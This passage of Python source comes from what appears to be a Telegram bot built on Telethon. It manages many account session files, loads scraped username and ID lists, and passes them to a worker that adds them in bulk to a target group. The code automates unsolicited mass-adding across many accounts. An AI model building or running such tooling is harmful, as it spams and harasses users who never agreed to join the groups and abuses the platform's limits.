                        await events.edit("Session Runed in Two different IP address plz choose another acc")
                        await client.disconnect()



                # except ValueError:
                #     await events.respond("این لینک منقضی شده و یا درست نیست ")
                #     await client.disconnect()

                # except errors.rpcerrorlist.FloodWaitError as e:
                #     wait = [int(s) for s in str(e).split() if s.isdigit()][0]
                #     await events.respond(f" `FloodWait ` : {wait} \n Try another Account")
                #     await client.disconnect()

                # except Exception as e:
                #     await events.respond(f" `Error ` : {e.__class__} \n Try another Account")
                #     await client.disconnect()                    

            else:
                await events.edit('Error In find api data for account {}! Please Re Login this account!'.format(phone))


        elif callback == 'clean':
            usernames.clear()
            await events.edit('Done Usernames List is empty now!')
        

        elif callback == 'no':
            await events.edit('Ok i cancel this process')
        


        elif callback.startswith('load'):
            kuy = callback.split('|')[1]
            mfile = get_file(kuy.split('.txt')[0])

            


            if mfile != 0 :
                for item in mfile:

                    if ("id." in kuy):
                        userid.append(int(item.split('\n')[0]))
                    else :
                        usernames.append((item.split('\n')[0]))

                ev = []
                for item in os.scandir('Database'):
                    l = [[Button.inline(item.name,'load|{}'.format(item.name))]]
                    ev.extend(l)
                if len(l) >= 1 :
                    ev.extend([[Button.inline("cancel" , "close")]])
                    
                    if ("id" in kuy):

                        await events.edit('✅ You have  `{}` userid \n add more ? '.format(len(list(set(userid)))) , buttons=ev)

                    else :
                        await events.edit('✅ You have  `{}` usernames add more ?'.format(len(list(set(usernames)))) , buttons=ev)


                else:
                    await events.reply('List is empty')


                
            else:
                await events.edit('Error in Loading File ')


        elif callback.startswith('settings'):
            phn = callback.split('|')[1]
            await events.reply('What you want with {} ?'.format(phn),buttons = [
                [Button.inline('🗑 Delete','delete|{}'.format(phn)),Button.inline('Close','close')]
            ])

        elif callback == 'close':
            await events.edit('Pannel Closed Success')
        
        elif callback.startswith('delete'):
            pehen = callback.split('|')[1]
            try:
                os.remove('Accounts/{}'.format(pehen))
                await events.edit('Account  {} Deleted From DB SuccessFully'.format(pehen))
            except :
                await events.edit('We have Error for Deleteing  {} from DB '.format(pehen))




        elif (callback.startswith("add")):
            ev = []
            datas = callback.split("|")
            for item in os.scandir(f'Accounts'):
                if 'journal' not in item.name and '.session' in item.name:                   
                    ev.append(item.name)


            
            
            mode = datas[0]

            datas[1] = datas[1].strip()


            
            if 'joinchat' in datas[1] :
                link = datas[1]
            elif '@' in datas[1]:
                link = datas[1]
            else:
                link = None
            if link != None:
                if (len(ev) < int(datas[2])):
                    await events.reply("**⚠️ Your Accounts is less than Order Accounts num !  **")
                else :    
                    msg = await events.reply('لطفا صبر کنید .....')
                    await worker(msg,datas[1],datas[2], datas[3]  , mode , usernames  , datas[4])
            else:
                await events.reply('🔆 Destination Group is Invalid ')




if __name__ == '__main__':


    bot.run_until_disconnected()
